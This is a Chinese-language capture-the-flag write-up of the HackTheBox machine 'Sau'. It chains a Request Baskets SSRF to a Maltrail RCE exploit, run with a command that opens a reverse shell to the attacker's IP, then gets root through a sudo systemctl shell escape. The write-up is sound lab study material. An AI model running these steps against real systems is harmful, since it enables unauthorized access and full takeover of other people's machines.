---
title: "Sau"
description: "这篇HackTheBox Linux 靶机 Sau 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 Sau 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2024-10-25T04:55:00+08:00"
publishDate: "2024-10-25T04:55:00+08:00"
lastmod: "2024-10-25T04:55:00+08:00"
url: "/hackthebox/linux/sau/"
image: "images/oscp-banners/banner-010.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对目标服务器进行端口扫描

```
sudo nmap -p- 10.10.11.224 -open
```

![image-20240908142428809](https://s2.loli.net/2024/09/08/BpvIH9a6sD7XkCf.png)

对开放的端口进一步探测

```
sudo nmap -p22,5555 -A 10.10.11.224 -oX sau.xml
```

![image-20240908143242876](https://s2.loli.net/2024/09/08/RejK9rhDnqXa2gU.png)

55555端口从扫描的结果看是一个http服务端口，对其进行路径探测和扫描

```
dirsearch -u http://10.10.11.224/
```



![image-20240908143735722](https://s2.loli.net/2024/09/08/MalOxLtKZUsdXT1.png)

![image-20240908143744613](https://s2.loli.net/2024/09/08/eKIOR7uiZ2c4AYm.png)

![image-20240908143937957](https://files.seeusercontent.com/2026/04/07/B3iz/image-20240908143937957.png)

优先对该软件版本的exp进行搜索，发现存在ssrf漏洞，故可以利用这个漏洞查看只针对本地资源的漏洞，故在setting中修改（https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7）

![image-20240908151733823](https://files.seeusercontent.com/2026/04/06/u4dR/image-20240908151733823.png)

然后访问创建的新baket

http://10.10.11.224:55555/web/l0kt7n3

![image-20240908151811082](https://s2.loli.net/2024/09/08/FiYcoODXZSbH8qe.png)

查询这个版本内容，发现存在rce（https://github.com/spookier/Maltrail-v0.53-Exploit）

```
python3 exploit.py 10.10.16.15 12345 http://10.10.11.224:55555/l0kt7n3
```

![image-20240910231859841](https://s2.loli.net/2024/09/10/WhTeciLy4Pj2tpq.png)

成功突破边界，在home/puma下查找到flag，接下来开始提权

```
sudo -l
```

![image-20240910232704972](https://s2.loli.net/2024/09/10/iU2fxJlg9zEqWue.png)

通过gtfobins查询

![image-20240910232726218](https://s2.loli.net/2024/09/10/n9agLPBWebZqGAY.png)

```
sudo /usr/bin/systemctl status trail.service
!sh
```

![image-20240910232748511](https://s2.loli.net/2024/09/10/r24E1S9Iut3Fb6H.png)

成功在root目录下发现flag

